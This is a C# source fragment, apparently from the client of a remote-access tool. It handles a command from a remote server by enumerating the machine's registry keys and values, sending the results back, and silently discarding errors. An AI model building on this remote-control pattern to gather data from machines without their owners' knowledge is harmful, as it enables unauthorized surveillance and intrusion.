using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;
using xClient.Core.Registry;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE REGISTRY. */
    public static partial class CommandHandler
    {
        public static void HandleGetRegistryKey(xClient.Core.Packets.ServerPackets.DoLoadRegistryKey packet, Client client)
        {
            try
            {
                seeker = new RegistrySeeker();

                xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse responsePacket = new Packets.ClientPackets.GetRegistryKeysResponse();

                seeker.SearchComplete += (object o, SearchCompletedEventArgs e) =>
                {
                    responsePacket.Matches = e.Matches.ToArray();

                    responsePacket.Execute(client);
                };

                // If the search parameters of the packet is null, the server is requesting to obtain the root keys.
                if (packet.RootKeyNames == null)
                {
                    responsePacket.IsRootKey = true;
                    seeker.Start(new RegistrySeekerParams(RegistrySeeker.ROOT_KEYS, Enums.RegistrySearchAction.Keys | Enums.RegistrySearchAction.Values));
                }
                else
                {
                    seeker.Start(packet.RootKeyNames);
                }
            }
            catch
            { }
        }
    }
}